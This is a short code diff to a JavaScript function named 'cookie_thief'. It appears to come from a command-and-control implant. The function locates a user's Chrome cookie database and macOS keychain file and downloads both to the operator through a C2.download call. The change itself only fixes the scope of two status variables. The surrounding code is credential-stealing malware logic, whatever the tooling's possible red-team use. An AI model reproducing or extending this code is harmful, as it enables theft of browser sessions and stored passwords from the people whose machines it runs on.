@@ -1,5 +1,7 @@
 exports.cookie_thief = function(task, command, params){
     let config = JSON.parse(params);
+    let keyDL_status = {};
+    let cookieDL_status = {};
     let password = "";
     var username = "";
     let browser = "chrome";
@@ -33,7 +35,7 @@ exports.cookie_thief = function(task, command, params){
     console.log(cookieDLPath)
 
     try{
-        let cookieDL_status = C2.download(task, cookieDLPath);
+        cookieDL_status = C2.download(task, cookieDLPath);
     	  if(cookieDL_status.hasOwnProperty("file_id")){
     	      cookieDL_status['user_output'] = "Finished Downloading";
         }
@@ -44,7 +46,7 @@ exports.cookie_thief = function(task, command, params){
 
     keypath = homedir + username + "/" + keychainpath;
     try{
-        let keyDL_status = C2.download(task, keypath);
+        keyDL_status = C2.download(task, keypath);
     	  if(keyDL_status.hasOwnProperty("file_id")){
     	      keyDL_status['user_output'] = "Finished Downloading";
         }
